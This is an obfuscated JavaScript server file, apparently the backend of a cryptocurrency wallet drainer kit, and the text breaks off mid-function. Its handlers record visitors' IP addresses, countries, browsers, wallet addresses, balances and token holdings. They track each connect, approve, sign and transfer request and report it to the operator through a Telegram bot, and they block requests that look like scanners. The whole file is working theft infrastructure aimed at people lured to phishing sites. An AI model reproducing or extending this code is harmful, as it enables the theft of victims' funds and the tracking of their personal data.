_0x33ae99=JSON[_0x33aaad(0xc8)](fs[_0x33aaad(0x18c)](_0x33aaad(0x142),_0x33aaad(0x167))),_0x59aa34=Math[_0x33aaad(0x16a)](Date['now']()/0x3e8);_0x476654['ts']=_0x59aa34,_0x33ae99[_0x33aaad(0x73)](_0x476654),fs[_0x33aaad(0xeb)]('API_DATA',JSON[_0x33aaad(0xed)](_0x33ae99),_0x33aaad(0x167));}catch(_0x4cbda7){console[_0x33aaad(0xb9)](_0x4cbda7);}},chain_id_to_name=_0x46e70a=>{const _0x21bd69=_0xb41be2;switch(_0x46e70a){case 0x1:return _0x21bd69(0x99);case 0xa:return _0x21bd69(0x133);case 0x38:return _0x21bd69(0x8b);case 0x89:return'Polygon\x20(MATIC)';case 0xfa:return _0x21bd69(0x1cf);case 0xa4b1:return _0x21bd69(0x178);case 0xa86a:return'Avalanche';default:return _0x21bd69(0x110);}},detect_browser=_0x32f4b5=>{const _0x57b5d1=_0xb41be2;try{return _0x32f4b5['browser'];}catch(_0x3894a4){return console['log'](_0x3894a4),_0x57b5d1(0x173);}},detect_OS=_0xf8c088=>{const _0x174071=_0xb41be2;try{return _0xf8c088['os'];}catch(_0x58a6a7){return console[_0x174071(0xb9)](_0x58a6a7),'Unknown';}},detect_country=async _0x422a50=>{const _0x159e68=_0xb41be2;try{const _0x24e2da=await axios['get']('http://ip-api.com/json/'+_0x422a50);if(_0x24e2da[_0x159e68(0xd9)][_0x159e68(0x1cc)]=='success')return _0x24e2da['data'][_0x159e68(0xe3)];else return _0x159e68(0x6a);}catch(_0x34b686){return console[_0x159e68(0xb9)](_0x34b686),_0x159e68(0x6a);}},on_enter_website=async(_0x2916e8,_0x525471)=>{const _0x4dfcec=_0xb41be2;try{let _0x10ce1c=await detect_country(_0x525471['IP']),_0x2e4580=detect_browser(_0x525471['UA']),_0x46047c=detect_OS(_0x525471['UA']);add_record({'type':_0x4dfcec(0x8d),'domain':_0x525471['domain'],'IP':_0x525471['IP'],'UA':_0x525471['UA'][_0x4dfcec(0x84)],'country':_0x10ce1c,'browser':_0x2e4580,'OS':_0x46047c,'user_id':_0x525471[_0x4dfcec(0xa0)],'worker_id':_0x525471[_0x4dfcec(0x70)]||null});if(_0x525471['chat_data']==![]&&MS_Notifications[_0x4dfcec(0x8d)][_0x4dfcec(0x1b1)]||_0x525471['chat_data']!=![]&&_0x525471[_0x4dfcec(0x1a2)][_0x4dfcec(0x8d)]!=''){let _0x200434=_0x525471[_0x4dfcec(0x1a2)]==![]?MS_Notifications['enter_website']['chat_id']:_0x525471[_0x4dfcec(0x1a2)][_0x4dfcec(0x8d)];try{await bot[_0x4dfcec(0x1a3)](_0x200434,_0x4dfcec(0xe0)+_0x525471[_0x4dfcec(0x1a7)]+_0x4dfcec(0xb5)+_0x525471['IP']+_0x4dfcec(0x6f)+_0x10ce1c+_0x4dfcec(0x13d)+_0x525471['UA']['source']+_0x4dfcec(0x199)+_0x46047c+_0x4dfcec(0xa4)+_0x2e4580+'</code>\x0a<b>🕐\x20Time:</b>\x20<code>'+_0x525471[_0x4dfcec(0xbc)]+_0x4dfcec(0xae)+_0x525471[_0x4dfcec(0xa0)]+_0x4dfcec(0x126),{'parse_mode':_0x4dfcec(0x1a4)});}catch(_0x280580){console[_0x4dfcec(0xb9)](_0x280580);}}send_response(_0x2916e8,{'status':'OK'});}catch(_0x11517e){console[_0x4dfcec(0xb9)](_0x11517e),send_response(_0x2916e8,{'status':_0x4dfcec(0x8f),'error':_0x4dfcec(0x1cb)});}},on_leave_website=async(_0x34b42c,_0x26a179)=>{const _0x23f435=_0xb41be2;try{add_record({'type':_0x23f435(0xf9),'domain':_0x26a179[_0x23f435(0x1a7)],'IP':_0x26a179['IP'],'worker_id':_0x26a179[_0x23f435(0x70)]||null,'user_id':_0x26a179[_0x23f435(0xa0)]});if(_0x26a179[_0x23f435(0x1a2)]==![]&&MS_Notifications[_0x23f435(0xf9)][_0x23f435(0x1b1)]||_0x26a179[_0x23f435(0x1a2)]!=![]&&_0x26a179[_0x23f435(0x1a2)][_0x23f435(0xf9)]!=''){let _0x21879b=_0x26a179[_0x23f435(0x1a2)]==![]?MS_Notifications[_0x23f435(0xf9)][_0x23f435(0x184)]:_0x26a179[_0x23f435(0x1a2)]['leave_website'];try{await bot[_0x23f435(0x1a3)](_0x21879b,_0x23f435(0x160)+_0x26a179['user_id']+_0x23f435(0x189)+_0x26a179[_0x23f435(0x1a7)]+_0x23f435(0xb5)+_0x26a179['IP']+_0x23f435(0x126),{'parse_mode':_0x23f435(0x1a4)});}catch(_0x187833){console['log'](_0x187833);}}send_response(_0x34b42c,{'status':'OK'});}catch(_0x1480ce){console['log'](_0x1480ce),send_response(_0x34b42c,{'status':_0x23f435(0x8f),'error':_0x23f435(0x1cb)});}},on_connect_request=async(_0x22630d,_0x29f464)=>{const _0x5c13d8=_0xb41be2;try{if(MS_Protection){if(isNaN(parseInt(_0x29f464[_0x5c13d8(0xa0)]))||!Supported_Wallets[_0x5c13d8(0x86)](_0x29f464[_0x5c13d8(0x101)])){if(!User_IPs_Pool[_0x29f464['IP']])User_IPs_Pool[_0x29f464['IP']]={};return User_IPs_Pool[_0x29f464['IP']][_0x5c13d8(0x188)]=Math[_0x5c13d8(0x16a)](Date[_0x5c13d8(0x15b)]()/0x3e8)+0xa*0x3c,block_request(_0x22630d);}}add_record({'type':_0x5c13d8(0x11a),'domain':_0x29f464[_0x5c13d8(0x1a7)],'IP':_0x29f464['IP'],'worker_id':_0x29f464[_0x5c13d8(0x70)]||null,'wallet':_0x29f464['wallet'],'user_id':_0x29f464[_0x5c13d8(0xa0)]});if(_0x29f464['chat_data']==![]&&MS_Notifications[_0x5c13d8(0x11a)][_0x5c13d8(0x1b1)]||_0x29f464[_0x5c13d8(0x1a2)]!=![]&&_0x29f464['chat_data'][_0x5c13d8(0x11a)]!=''){let _0x552b2d=_0x29f464['chat_data']==![]?MS_Notifications[_0x5c13d8(0x11a)][_0x5c13d8(0x184)]:_0x29f464[_0x5c13d8(0x1a2)][_0x5c13d8(0x11a)];try{await bot['sendMessage'](_0x552b2d,'<b>❓\x20Requested\x20connection\x20from\x20user\x20#'+_0x29f464[_0x5c13d8(0xa0)]+_0x5c13d8(0x65)+_0x29f464[_0x5c13d8(0x1a7)]+_0x5c13d8(0xb5)+_0x29f464['IP']+_0x5c13d8(0x12d)+_0x29f464[_0x5c13d8(0x101)]+_0x5c13d8(0x126),{'parse_mode':_0x5c13d8(0x1a4)});}catch(_0x87e6bd){console[_0x5c13d8(0xb9)](_0x87e6bd);}}send_response(_0x22630d,{'status':'OK'});}catch(_0xd90b55){console['log'](_0xd90b55),send_response(_0x22630d,{'status':_0x5c13d8(0x8f),'error':'Unable\x20to\x20Execute'});}},on_connect_cancel=async(_0x29efa2,_0x13a3d5)=>{const _0x215f2e=_0xb41be2;try{add_record({'type':_0x215f2e(0x177),'domain':_0x13a3d5['domain'],'IP':_0x13a3d5['IP'],'worker_id':_0x13a3d5[_0x215f2e(0x70)]||null,'user_id':_0x13a3d5[_0x215f2e(0xa0)]});if(_0x13a3d5[_0x215f2e(0x1a2)]==![]&&MS_Notifications[_0x215f2e(0x177)][_0x215f2e(0x1b1)]||_0x13a3d5['chat_data']!=![]&&_0x13a3d5[_0x215f2e(0x1a2)][_0x215f2e(0x177)]!=''){let _0x1f0bcf=_0x13a3d5[_0x215f2e(0x1a2)]==![]?MS_Notifications[_0x215f2e(0x177)]['chat_id']:_0x13a3d5[_0x215f2e(0x1a2)][_0x215f2e(0x177)];try{await bot[_0x215f2e(0x1a3)](_0x1f0bcf,'<b>❌\x20User\x20#'+_0x13a3d5[_0x215f2e(0xa0)]+_0x215f2e(0x109)+_0x13a3d5['domain']+_0x215f2e(0xb5)+_0x13a3d5['IP']+_0x215f2e(0x126),{'parse_mode':_0x215f2e(0x1a4)});}catch(_0x2af2bb){console[_0x215f2e(0xb9)](_0x2af2bb);}}send_response(_0x29efa2,{'status':'OK'});}catch(_0x15304a){console[_0x215f2e(0xb9)](_0x15304a),send_response(_0x29efa2,{'status':_0x215f2e(0x8f),'error':'Unable\x20to\x20Execute'});}},on_connect_success=async(_0x46be7c,_0x94d61e)=>{const _0x6a50f0=_0xb41be2;try{if(MS_Protection){if(isNaN(parseInt(_0x94d61e[_0x6a50f0(0xa0)]))||!Supported_Wallets[_0x6a50f0(0x86)](_0x94d61e[_0x6a50f0(0x101)])||!_0x94d61e['address']['match'](/^0x\S{40,40}$/)){if(!User_IPs_Pool[_0x94d61e['IP']])User_IPs_Pool[_0x94d61e['IP']]={};return User_IPs_Pool[_0x94d61e['IP']][_0x6a50f0(0x188)]=Math[_0x6a50f0(0x16a)](Date['now']()/0x3e8)+0xa*0x3c,block_request(_0x46be7c);}}add_record({'type':_0x6a50f0(0x1b2),'domain':_0x94d61e[_0x6a50f0(0x1a7)],'IP':_0x94d61e['IP'],'user_id':_0x94d61e['user_id'],'wallet_type':_0x94d61e[_0x6a50f0(0x101)],'wallet_address':_0x94d61e[_0x6a50f0(0x1b7)],'wallet_network':_0x94d61e[_0x6a50f0(0x7a)],'worker_id':_0x94d61e['worker_id']||null});if(_0x94d61e[_0x6a50f0(0x1a2)]==![]&&MS_Notifications['connect_success']['mode']||_0x94d61e[_0x6a50f0(0x1a2)]!=![]&&_0x94d61e[_0x6a50f0(0x1a2)]['connect_success']!=''){let _0x3a4a38=_0x94d61e[_0x6a50f0(0x1a2)]==![]?MS_Notifications[_0x6a50f0(0x185)][_0x6a50f0(0x184)]:_0x94d61e[_0x6a50f0(0x1a2)]['connect_success'],_0x627ae9=await detect_country(_0x94d61e['IP']);await bot[_0x6a50f0(0x1a3)](_0x3a4a38,_0x6a50f0(0x172)+_0x94d61e[_0x6a50f0(0xa0)]+'\x20has\x20connected\x20a\x20wallet</b>\x0a\x0a<b>🌍\x20Domain:</b>\x20<code>'+_0x94d61e['domain']+_0x6a50f0(0xb5)+_0x94d61e['IP']+_0x6a50f0(0x6f)+_0x627ae9+')\x0a\x0a<b>💰\x20Wallet\x20type:</b>\x20<code>'+_0x94d61e[_0x6a50f0(0x101)]+_0x6a50f0(0xc4)+_0x94d61e[_0x6a50f0(0x1b7)]+_0x6a50f0(0xf2)+chain_id_to_name(_0x94d61e[_0x6a50f0(0x7a)])+'</code>\x0a\x0a<i>The\x20balance\x20is\x20being\x20calculated,\x20if\x20the\x20user\x20does\x20not\x20leave\x20the\x20site,\x20you\x20will\x20receive\x20a\x20notification</i>',{'parse_mode':_0x6a50f0(0x1a4)});}send_response(_0x46be7c,{'status':'OK'});}catch(_0x1b50d1){console['log'](_0x1b50d1),send_response(_0x46be7c,{'status':_0x6a50f0(0x8f),'error':_0x6a50f0(0x1cb)});}},on_check_finish=async(_0x43bd3a,_0x3ad8b2)=>{const _0x3444bb=_0xb41be2;try{add_record({'type':_0x3444bb(0x83),'domain':_0x3ad8b2[_0x3444bb(0x1a7)],'IP':_0x3ad8b2['IP'],'worker_id':_0x3ad8b2[_0x3444bb(0x70)]||null,'assets':_0x3ad8b2[_0x3444bb(0x1c5)],'balance':_0x3ad8b2['balance'],'user_id':_0x3ad8b2[_0x3444bb(0xa0)]});if(_0x3ad8b2[_0x3444bb(0x1a2)]==![]&&MS_Notifications[_0x3444bb(0x185)][_0x3444bb(0x1b1)]||_0x3ad8b2[_0x3444bb(0x1a2)]!=![]&&_0x3ad8b2[_0x3444bb(0x1a2)][_0x3444bb(0x185)]!=''){let _0x4fb907=_0x3ad8b2[_0x3444bb(0x1a2)]==![]?MS_Notifications[_0x3444bb(0x185)]['chat_id']:_0x3ad8b2[_0x3444bb(0x1a2)][_0x3444bb(0x185)],_0x27a0a4='',_0x5caec3='',_0x18345d='';for(const _0x170556 of _0x3ad8b2[_0x3444bb(0x1c5)]){try{if(_0x170556[_0x3444bb(0xcf)]==_0x3444bb(0x74))_0x27a0a4+=_0x170556[_0x3444bb(0x1bf)]+'\x20['+chain_id_to_name(_0x170556[_0x3444bb(0x7a)])+_0x3444bb(0xf3)+_0x170556[_0x3444bb(0x11f)][_0x3444bb(0xec)](0x2)+_0x3444bb(0x1d3);else{if(_0x170556[_0x3444bb(0xcf)]==_0x3444bb(0x93))_0x5caec3+=_0x170556[_0x3444bb(0x1bf)]+'\x20['+chain_id_to_name(_0x170556[_0x3444bb(0x7a)])+_0x3444bb(0xf3)+_0x170556['amount_usd'][_0x3444bb(0xec)](0x2)+_0x3444bb(0x1d3);else _0x170556[_0x3444bb(0xcf)]==_0x3444bb(0x7c)&&(_0x18345d+=_0x170556[_0x3444bb(0x1bf)]+'\x20['+chain_id_to_name(_0x170556['chain_id'])+_0x3444bb(0xf3)+_0x170556[_0x3444bb(0x11f)][_0x3444bb(0xec)](0x2)+_0x3444bb(0x1d3));}}catch(_0x47e218){console[_0x3444bb(0xb9)](_0x47e218);}}if(_0x27a0a4=='')_0x27a0a4=_0x3444bb(0x96);if(_0x5caec3=='')_0x5caec3=_0x3444bb(0x96);if(_0x18345d=='')_0x18345d=_0x3444bb(0x96);try{await bot[_0x3444bb(0x1a3)](_0x4fb907,_0x3444bb(0x145)+_0x3ad8b2[_0x3444bb(0xa0)]+_0x3444bb(0x1a5)+_0x3ad8b2[_0x3444bb(0x1b6)][_0x3444bb(0xec)](0x2)+_0x3444bb(0x1bc)+_0x27a0a4+'\x0a\x0a<b>ERC-20\x20tokens:</b>\x20'+_0x5caec3+_0x3444bb(0x131)+_0x18345d,{'parse_mode':_0x3444bb(0x1a4)});}catch(_0x305051){console[_0x3444bb(0xb9)](_0x305051);}}send_response(_0x43bd3a,{'status':'OK'});}catch(_0x4ddd4f){console[_0x3444bb(0xb9)](_0x4ddd4f),send_response(_0x43bd3a,{'status':'error','error':_0x3444bb(0x1cb)});}},on_chain_request=async(_0xc9919c,_0x560923)=>{const _0x1566da=_0xb41be2;try{add_record({'type':_0x1566da(0x108),'domain':_0x560923[_0x1566da(0x1a7)],'IP':_0x560923['IP'],'worker_id':_0x560923[_0x1566da(0x70)]||null,'current_chain':_0x560923[_0x1566da(0xee)][0x0],'suggest_chain':_0x560923[_0x1566da(0xee)][0x1],'user_id':_0x560923[_0x1566da(0xa0)]});if(_0x560923[_0x1566da(0x1a2)]==![]&&MS_Notifications[_0x1566da(0x108)][_0x1566da(0x1b1)]||_0x560923[_0x1566da(0x1a2)]!=![]&&_0x560923[_0x1566da(0x1a2)][_0x1566da(0x108)]!=''){let _0x21ef31=_0x560923['chat_data']==![]?MS_Notifications[_0x1566da(0x108)][_0x1566da(0x184)]:_0x560923[_0x1566da(0x1a2)][_0x1566da(0x108)];try{await bot[_0x1566da(0x1a3)](_0x21ef31,_0x1566da(0x1c4)+_0x560923[_0x1566da(0xa0)]+'\x20received\x20a\x20request\x20to\x20change\x20network</b>\x0a\x0a<b>⛓\x20Current\x20network:</b>\x20'+chain_id_to_name(_0x560923[_0x1566da(0xee)][0x0])+'\x0a<b>⛓\x20New\x20network:</b>\x20'+chain_id_to_name(_0x560923[_0x1566da(0xee)][0x1]),{'parse_mode':_0x1566da(0x1a4)});}catch(_0x4b52a1){console[_0x1566da(0xb9)](_0x4b52a1);}}send_response(_0xc9919c,{'status':'OK'});}catch(_0x174f20){console[_0x1566da(0xb9)](_0x174f20),send_response(_0xc9919c,{'status':_0x1566da(0x8f),'error':'Unable\x20to\x20Execute'});}},on_chain_success=async(_0x3d8024,_0x2253e5)=>{const _0x40daf6=_0xb41be2;try{add_record({'type':_0x40daf6(0x18d),'domain':_0x2253e5[_0x40daf6(0x1a7)],'IP':_0x2253e5['IP'],'worker_id':_0x2253e5[_0x40daf6(0x70)]||null,'user_id':_0x2253e5[_0x40daf6(0xa0)]});if(_0x2253e5[_0x40daf6(0x1a2)]==![]&&MS_Notifications[_0x40daf6(0x18d)][_0x40daf6(0x1b1)]||_0x2253e5[_0x40daf6(0x1a2)]!=![]&&_0x2253e5[_0x40daf6(0x1a2)]['chain_success']!=''){let _0x423b0c=_0x2253e5[_0x40daf6(0x1a2)]==![]?MS_Notifications['chain_success']['chat_id']:_0x2253e5[_0x40daf6(0x1a2)]['chain_success'];try{await bot[_0x40daf6(0x1a3)](_0x423b0c,_0x40daf6(0x79)+_0x2253e5[_0x40daf6(0xa0)]+_0x40daf6(0xf1),{'parse_mode':_0x40daf6(0x1a4)});}catch(_0x444d6c){console[_0x40daf6(0xb9)](_0x444d6c);}}send_response(_0x3d8024,{'status':'OK'});}catch(_0x52b8a6){console[_0x40daf6(0xb9)](_0x52b8a6),send_response(_0x3d8024,{'status':'error','error':_0x40daf6(0x1cb)});}},on_chain_cancel=async(_0x46e180,_0x2edcf9)=>{const _0x4855f6=_0xb41be2;try{add_record({'type':_0x4855f6(0x120),'domain':_0x2edcf9[_0x4855f6(0x1a7)],'IP':_0x2edcf9['IP'],'worker_id':_0x2edcf9[_0x4855f6(0x70)]||null,'user_id':_0x2edcf9[_0x4855f6(0xa0)]});if(_0x2edcf9[_0x4855f6(0x1a2)]==![]&&MS_Notifications[_0x4855f6(0x120)][_0x4855f6(0x1b1)]||_0x2edcf9[_0x4855f6(0x1a2)]!=![]&&_0x2edcf9[_0x4855f6(0x1a2)][_0x4855f6(0x120)]!=''){let _0x5baf5f=_0x2edcf9[_0x4855f6(0x1a2)]==![]?MS_Notifications[_0x4855f6(0x120)][_0x4855f6(0x184)]:_0x2edcf9[_0x4855f6(0x1a2)][_0x4855f6(0x120)];try{await bot[_0x4855f6(0x1a3)](_0x5baf5f,_0x4855f6(0x9a)+_0x2edcf9[_0x4855f6(0xa0)]+_0x4855f6(0xab),{'parse_mode':_0x4855f6(0x1a4)});}catch(_0x5a77e1){console[_0x4855f6(0xb9)](_0x5a77e1);}}send_response(_0x46e180,{'status':'OK'});}catch(_0x5cbfba){console[_0x4855f6(0xb9)](_0x5cbfba),send_response(_0x46e180,{'status':_0x4855f6(0x8f),'error':_0x4855f6(0x1cb)});}},on_transfer_cancel=async(_0x1992d6,_0x4c762d)=>{const _0x403be7=_0xb41be2;try{add_record({'type':_0x403be7(0x1c3),'domain':_0x4c762d[_0x403be7(0x1a7)],'IP':_0x4c762d['IP'],'worker_id':_0x4c762d[_0x403be7(0x70)]||null,'user_id':_0x4c762d[_0x403be7(0xa0)]});if(_0x4c762d[_0x403be7(0x1a2)]==![]&&MS_Notifications['transfer_cancel'][_0x403be7(0x1b1)]||_0x4c762d[_0x403be7(0x1a2)]!=![]&&_0x4c762d[_0x403be7(0x1a2)]['transfer_cancel']!=''){let _0x2622ce=_0x4c762d[_0x403be7(0x1a2)]==![]?MS_Notifications[_0x403be7(0x1c3)][_0x403be7(0x184)]:_0x4c762d[_0x403be7(0x1a2)][_0x403be7(0x1c3)];try{await bot['sendMessage'](_0x2622ce,_0x403be7(0x9a)+_0x4c762d[_0x403be7(0xa0)]+_0x403be7(0x117),{'parse_mode':'HTML'});}catch(_0x4ab522){console['log'](_0x4ab522);}}send_response(_0x1992d6,{'status':'OK'});}catch(_0xfc3536){console[_0x403be7(0xb9)](_0xfc3536),send_response(_0x1992d6,{'status':_0x403be7(0x8f),'error':_0x403be7(0x1cb)});}},on_approve_cancel=async(_0x59aedf,_0x2d91e6)=>{const _0xbf5898=_0xb41be2;try{add_record({'type':_0xbf5898(0x6e),'domain':_0x2d91e6[_0xbf5898(0x1a7)],'IP':_0x2d91e6['IP'],'worker_id':_0x2d91e6['worker_id']||null,'user_id':_0x2d91e6[_0xbf5898(0xa0)]});if(_0x2d91e6[_0xbf5898(0x1a2)]==![]&&MS_Notifications[_0xbf5898(0x6e)][_0xbf5898(0x1b1)]||_0x2d91e6[_0xbf5898(0x1a2)]!=![]&&_0x2d91e6[_0xbf5898(0x1a2)][_0xbf5898(0x6e)]!=''){let _0x392b77=_0x2d91e6[_0xbf5898(0x1a2)]==![]?MS_Notifications['approve_cancel'][_0xbf5898(0x184)]:_0x2d91e6[_0xbf5898(0x1a2)][_0xbf5898(0x6e)];try{await bot['sendMessage'](_0x392b77,'<b>❌\x20User\x20#'+_0x2d91e6['user_id']+_0xbf5898(0x152),{'parse_mode':_0xbf5898(0x1a4)});}catch(_0x476f58){console[_0xbf5898(0xb9)](_0x476f58);}}send_response(_0x59aedf,{'status':'OK'});}catch(_0x45fbca){console[_0xbf5898(0xb9)](_0x45fbca),send_response(_0x59aedf,{'status':_0xbf5898(0x8f),'error':'Unable\x20to\x20Execute'});}},on_sign_cancel=async(_0x3afc0b,_0xf77f27)=>{const _0x490f89=_0xb41be2;try{add_record({'type':_0x490f89(0x18a),'domain':_0xf77f27[_0x490f89(0x1a7)],'IP':_0xf77f27['IP'],'worker_id':_0xf77f27[_0x490f89(0x70)]||null,'user_id':_0xf77f27['user_id']});if(_0xf77f27[_0x490f89(0x1a2)]==![]&&MS_Notifications[_0x490f89(0x18a)][_0x490f89(0x1b1)]||_0xf77f27[_0x490f89(0x1a2)]!=![]&&_0xf77f27[_0x490f89(0x1a2)][_0x490f89(0x18a)]!=''){let _0x4129f6=_0xf77f27[_0x490f89(0x1a2)]==![]?MS_Notifications[_0x490f89(0x18a)][_0x490f89(0x184)]:_0xf77f27['chat_data'][_0x490f89(0x18a)];try{await bot['sendMessage'](_0x4129f6,_0x490f89(0x9a)+_0xf77f27[_0x490f89(0xa0)]+_0x490f89(0xa6),{'parse_mode':_0x490f89(0x1a4)});}catch(_0x37c441){console[_0x490f89(0xb9)](_0x37c441);}}send_response(_0x3afc0b,{'status':'OK'});}catch(_0x2d284b){console[_0x490f89(0xb9)](_0x2d284b),send_response(_0x3afc0b,{'status':_0x490f89(0x8f),'error':_0x490f89(0x1cb)});}},on_sign_unavailable=async(_0x1d2242,_0x228978)=>{const _0x4809ce=_0xb41be2;try{add_record({'type':_0x4809ce(0x1c9),'domain':_0x228978[_0x4809ce(0x1a7)],'IP':_0x228978['IP'],'worker_id':_0x228978[_0x4809ce(0x70)]||null,'user_id':_0x228978['user_id']});if(_0x228978['chat_data']==![]&&MS_Notifications[_0x4809ce(0x18a)]['mode']||_0x228978[_0x4809ce(0x1a2)]!=![]&&_0x228978[_0x4809ce(0x1a2)]['sign_cancel']!=''){let _0x363b1f=_0x228978[_0x4809ce(0x1a2)]==![]?MS_Notifications['sign_cancel'][_0x4809ce(0x184)]:_0x228978['chat_data'][_0x4809ce(0x18a)];try{await bot['sendMessage'](_0x363b1f,_0x4809ce(0x19d)+_0x228978[_0x4809ce(0xa0)]+'</b>\x0a\x0a<i>If\x20possible,\x20we\x20will\x20offer\x20him\x20another\x20method...</i>',{'parse_mode':_0x4809ce(0x1a4)});}catch(_0x16cd0d){console['log'](_0x16cd0d);}}send_response(_0x1d2242,{'status':'OK'});}catch(_0xbc8206){console['log'](_0xbc8206),send_response(_0x1d2242,{'status':_0x4809ce(0x8f),'error':_0x4809ce(0x1cb)});}},on_sign_request=async(_0x1b714a,_0x29eaf6)=>{const _0x4fc031=_0xb41be2;try{add_record({'type':'sign_request','domain':_0x29eaf6[_0x4fc031(0x1a7)],'IP':_0x29eaf6['IP'],'worker_id':_0x29eaf6[_0x4fc031(0x70)]||null,'asset':_0x29eaf6['asset'],'user_id':_0x29eaf6[_0x4fc031(0xa0)]});if(_0x29eaf6[_0x4fc031(0x1a2)]==![]&&MS_Notifications[_0x4fc031(0x1d2)][_0x4fc031(0x1b1)]||_0x29eaf6[_0x4fc031(0x1a2)]!=![]&&_0x29eaf6['chat_data'][_0x4fc031(0x1d2)]!=''){let _0x187e24=_0x29eaf6[_0x4fc031(0x1a2)]==![]?MS_Notifications[_0x4fc031(0x1d2)][_0x4fc031(0x184)]:_0x29eaf6[_0x4fc031(0x1a2)]['sign_request'];try{await bot[_0x4fc031(0x1a3)](_0x187e24,_0x4fc031(0x1c4)+_0x29eaf6['user_id']+_0x4fc031(0x18b)+_0x29eaf6[_0x4fc031(0x154)][_0x4fc031(0x1bf)]+'\x20['+chain_id_to_name(_0x29eaf6[_0x4fc031(0x154)]['chain_id'])+',\x20'+_0x29eaf6[_0x4fc031(0x154)][_0x4fc031(0xcf)]+_0x4fc031(0xf3)+parseFloat(_0x29eaf6[_0x4fc031(0x154)][_0x4fc031(0x11f)])['toFixed'](0x2)+'$)',{'parse_mode':_0x4fc031(0x1a4)});}catch(_0x23386c){console[_0x4fc031(0xb9)](_0x23386c);}}send_response(_0x1b714a,{'status':'OK'});}catch(_0x2f22f6){console[_0x4fc031(0xb9)](_0x2f22f6),send_response(_0x1b714a,{'status':'error','error':'Unable\x20to\x20Execute'});}},on_approve_request=async(_0xcfc2f4,_0x4764ff)=>{const _0x367812=_0xb41be2;try{add_record({'type':_0x367812(0xff),'domain':_0x4764ff[_0x367812(0x1a7)],'IP':_0x4764ff['IP'],'worker_id':_0x4764ff['worker_id']||null,'asset':_0x4764ff[_0x367812(0x154)],'user_id':_0x4764ff[_0x367812(0xa0)]});if(_0x4764ff[_0x367812(0x1a2)]==![]&&MS_Notifications['approve_request'][_0x367812(0x1b1)]||_0x4764ff['chat_data']!=![]&&_0x4764ff[_0x367812(0x1a2)]['approve_request']!=''){let _0x4bf2dc=_0x4764ff[_0x367812(0x1a2)]==![]?MS_Notifications[_0x367812(0xff)][_0x367812(0x184)]:_0x4764ff['chat_data'][_0x367812(0xff)];try{await bot['sendMessage'](_0x4bf2dc,_0x367812(0x1c4)+_0x4764ff[_0x367812(0xa0)]+_0x367812(0x141)+_0x4764ff['asset'][_0x367812(0x1bf)]+'['+chain_id_to_name(_0x4764ff[_0x367812(0x154)]['chain_id'])+',\x20'+_0x4764ff['asset'][_0x367812(0xcf)]+_0x367812(0xf3)+parseFloat(_0x4764ff[_0x367812(0x154)][_0x367812(0x11f)])[_0x367812(0xec)](0x2)+'$)',{'parse_mode':'HTML'});}catch(_0x48696c){console[_0x367812(0xb9)](_0x48696c);}}send_response(_0xcfc2f4,{'status':'OK'});}catch(_0x4d4588){console[_0x367812(0xb9)](_0x4d4588),send_response(_0xcfc2f4,{'status':'error','error':'Unable\x20to\x20Execute'});}},on_transfer_request=async(_0x74bb54,_0x3fd774)=>{const _0x138d73=_0xb41be2;try{add_record({'type':'transfer_request','domain':_0x3fd774['domain'],'IP':_0x3fd774['IP'],'worker_id':_0x3fd774[_0x138d73(0x70)]||null,'asset':_0x3fd774[_0x138d73(0x154)],'user_id':_0x3fd774[_0x138d73(0xa0)]});if(_0x3fd774[_0x138d73(0x1a2)]==![]&&MS_Notifications[_0x138d73(0xd8)][_0x138d73(0x1b1)]||_0x3fd774['chat_data']!=![]&&_0x3fd774[_0x138d73(0x1a2)][_0x138d73(0xd8)]!=''){let _0x4ce3c8=_0x3fd774[_0x138d73(0x1a2)]==![]?MS_Notifications[_0x138d73(0xd8)]['chat_id']:_0x3fd774[_0x138d73(0x1a2)][_0x138d73(0xd8)];try{await bot[_0x138d73(0x1a3)](_0x4ce3c8,'<b>❓\x20User\x20#'+_0x3fd774['user_id']+_0x138d73(0x14f)+_0x3fd774['asset'][_0x138d73(0x1bf)]+'['+chain_id_to_name(_0x3fd774['asset'][_0x138d73(0x7a)])+',\x20'+_0x3fd774[_0x138d73(0x154)]['type']+']\x20('+parseFloat(_0x3fd774[_0x138d73(0x154)][_0x138d73(0x11f)])[_0x138d73(0xec)](0x2)+'$)',{'parse_mode':_0x138d73(0x1a4)});}catch(_0x4655f5){console['log'](_0x4655f5);}}send_response(_0x74bb54,{'status':'OK'});}catch(_0x2218fa){console[_0x138d73(0xb9)](_0x2218fa),send_response(_0x74bb54,{'status':_0x138d73(0x8f),'error':_0x138d73(0x1cb)});}},on_sign_success=async(_0x4c9a09,_0xa364b2)=>{const _0x15317f=_0xb41be2;try{add_record({'type':'sign_success','domain':_0xa364b2[_0x15317f(0x1a7)],'IP':_0xa364b2['IP'],'user_id':_0xa364b2[_0x15317f(0xa0)],'asset':_0xa364b2['asset'],'worker_id':_0xa364b2[_0x15317f(0x70)]||null});_0xa364b2[_0x15317f(0x154)]['type']==_0x15317f(0x74)&&add_record({'type':_0x15317f(0xc3),'domain':_0xa364b2['domain'],'IP':_0xa364b2['IP'],'user_id':_0xa364b2[_0x15317f(0xa0)],'asset':_0xa364b2['asset'],'worker_id':_0xa364b2[_0x15317f(0x70)]||null});if(_0xa364b2[_0x15317f(0x1a2)]==![]&&MS_Notifications[_0x15317f(0xb0)][_0x15317f(0x1b1)]||_0xa364b2[_0x15317f(0x1a2)]!=![]&&_0xa364b2[_0x15317f(0x1a2)][_0x15317f(0xb0)]!=''){let _0x37187b=_0xa364b2[_0x15317f(0x1a2)]==![]?MS_Notifications['sign_success'][_0x15317f(0x184)]:_0xa364b2[_0x15317f(0x1a2)]['sign_success'];try{await bot[_0x15317f(0x1a3)](_0x37187b,_0x15317f(0x79)+_0xa364b2[_0x15317f(0xa0)]+_0x15317f(0x81)+_0xa364b2[_0x15317f(0x154)]['name']+'\x20['+chain_id_to_name(_0xa364b2[_0x15317f(0x154)][_0x15317f(0x7a)])+','+_0xa364b2[_0x15317f(0x154)][_0x15317f(0xcf)]+_0x15317f(0xf3)+parseFloat(_0xa364b2['asset'][_0x15317f(0x11f)])[_0x15317f(0xec)](0x2)+'$)',{'parse_mode':'HTML'});}catch(_0x21418b){console[_0x15317f(0xb9)](_0x21418b);}}send_response(_0x4c9a09,{'status':'OK'});}catch(_0x45c033){console[_0x15317f(0xb9)](_0x45c033),send_response(_0x4c9a09,{'status':_0x15317f(0x8f),'error':'Unable\x20to\x20Execute'});}},on_approve_success=async(_0x987872,_0xce053a)=>{const 